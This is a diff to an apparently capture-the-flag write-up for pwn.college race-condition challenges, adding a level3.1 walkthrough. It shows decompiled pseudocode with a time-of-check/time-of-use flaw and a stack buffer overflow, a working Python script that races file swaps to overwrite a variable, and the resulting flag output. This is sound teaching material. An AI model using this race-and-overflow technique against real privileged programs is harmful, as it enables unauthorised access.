@@ -300,7 +300,7 @@ This means we don't need to swap to a symlink at all. We just need to:
 3. `read()` overflows `buf` into `v7`, making it non-zero.
 4. `win()` is called and prints the flag.
 
-## Exploit
+### Exploit
 
 ```python title="~/script.py" showLineNumbers
 import subprocess, time, os
@@ -400,3 +400,166 @@ pwn.college{YjdXcuUWNbwI3UnjvP86hY7QNs8.0VNwQDL4ITM0EzW}
 
 &nbsp;
 
+## level3.1[​](#level31 "Direct link to level3.1")
+> Exploit a race condition to corrupt memory, affecting the behavior of the challenge.
+
+```text
+hacker@race-conditions~level3-1:~$ /challenge/babyrace_level3.1
+###
+### Welcome to /challenge/babyrace_level3.1!
+###
+This challenge allows you to open a single file, as specified by the first argument to the program (argv[1]).
+The file opened will be read in.
+This challenge will verify that the file's path does not include "flag".
+This challenge will verify that the file is not a symlink.
+This challenge will verify that the file is not larger than 256 bytes.
+```
+
+The program performs three checks before opening the file:
+
+1. The path must not contain the string `"flag"`.
+2. The file at that path must not be a symlink (`lstat` → `S_ISLNK`).
+3. The file must not be larger than 256 bytes (`lstat` → `st_size`).
+
+### Source code
+
+Decompiling the binary reveals the following:
+
+```c title="/challenge/babyrace_level3.1 :: Pseudocode" showLineNumbers
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  int v3; // eax
+  struct stat stat_buf; // [rsp+20h] [rbp-1A0h] BYREF
+  char buf[256]; // [rsp+B0h] [rbp-110h] BYREF
+  __int64 v7; // [rsp+1B0h] [rbp-10h]
+  unsigned __int64 v8; // [rsp+1B8h] [rbp-8h]
+
+  v8 = __readfsqword(0x28u);
+  setvbuf(stdin, 0LL, 2, 0LL);
+  setvbuf(stdout, 0LL, 2, 0LL);
+  puts("###");
+  printf("### Welcome to %s!\n", *argv);
+  puts("###");
+  putchar(10);
+  v7 = 0LL;
+  if ( argc <= 1 )
+    __assert_fail("argc > 1", "<stdin>", 0x49u, "main");
+  if ( strstr(argv[1], "flag") )
+  {
+    puts("Error: path contains `flag`!");
+    exit(1);
+  }
+  if ( (unsigned int)lstat((char *)argv[1], &stat_buf) == -1 )
+  {
+    puts("Error: failed to get file status!");
+    exit(1);
+  }
+  if ( (stat_buf.st_mode & 0xF000) == 40960 )
+  {
+    puts("Error: file is a symlink!");
+    exit(1);
+  }
+  if ( stat_buf.st_size > 256 )
+  {
+    puts("Error: file is too large!");
+    exit(1);
+  }
+  v3 = open(argv[1], 0);
+  read(v3, buf, 0x1000uLL);
+  if ( v7 )
+    win();
+  puts("### Goodbye!");
+  return 0;
+}
+```
+
+This is identical to [level3.0](#level30) with one critical difference: **the `getchar()` pauses are gone**. There is no artificial delay between the `lstat` check and the `open()` call, making the race window much tighter.
+
+### TOCTOU
+
+The checks and the subsequent `open()` call are still **not atomic**. The window between `lstat` and `open()` is now just natural CPU time — microseconds — but it still exists:
+
+```text
+Timeline:
+  Program:  [lstat check — small file ✓] -tiny gap- [open() → reads file]
+  Attacker:      ^small "hi" file^          ^swap!^   ^big overflow file^
+```
+
+### Stack Buffer Overflow
+
+Same vulnerability as level3.0. `read(v3, buf, 0x1000uLL)` reads up to **4096 bytes** into `buf` which is only **256 bytes**:
+
+```text
+char buf[256]   →  [rbp-110h]
+__int64 v7      →  [rbp-10h]
+```
+
+The offset from `buf` to `v7` is `0x110 - 0x10 = 0x100` = **256 bytes**. Writing 264 bytes overwrites `v7` with a non-zero value, triggering `win()`.
+
+Since there are no pauses, we use a background thread to continuously swap `x` between a small file and the overflow payload as fast as possible, while hammering the binary in the main loop.
+
+### Exploit
+
+```python title="~/script.py" showLineNumbers
+import subprocess, os, threading
+
+# Create overflow payload - 264 bytes to fill buf (256) + overwrite v7 (8 bytes)
+payload = b"A" * 264
+with open("bigfile", "wb") as f:
+    f.write(payload)
+
+print("[*] Starting exploit loop...")
+
+stop = False
+attempt = 0
+
+def swapper():
+    """Continuously swap x between small file and big file"""
+    while not stop:
+        os.system("rm -f x && echo hi > x")
+        os.system("rm -f x && cp bigfile x")
+
+# Start swap thread
+t = threading.Thread(target=swapper, daemon=True)
+t.start()
+
+while not stop:
+    attempt += 1
+
+    try:
+        out = subprocess.check_output(
+            ["/challenge/babyrace_level3.1", "x"],
+            stderr=subprocess.STDOUT,
+            timeout=2
+        )
+    except subprocess.TimeoutExpired:
+        continue
+    except subprocess.CalledProcessError as e:
+        out = e.output
+    except Exception:
+        continue
+
+    if attempt % 1000 == 0:
+        print(f"[*] Attempt {attempt}...")
+
+    if b"pwn.college" in out:
+        stop = True
+        print("[+] Got the flag!")
+        print(out.decode(errors='replace'))
+        break
+```
+
+```text
+hacker@race-conditions~level3-1:~$ python ~/script.py
+[*] Starting exploit loop...
+[+] Got the flag!
+###
+### Welcome to /challenge/babyrace_level3.1!
+###
+
+You win! Here is your flag:
+pwn.college{QaC5k6aR0cDMtWJ22pLmn4OzYaz.0lNwQDL4ITM0EzW}
+
+
+### Goodbye!
+```
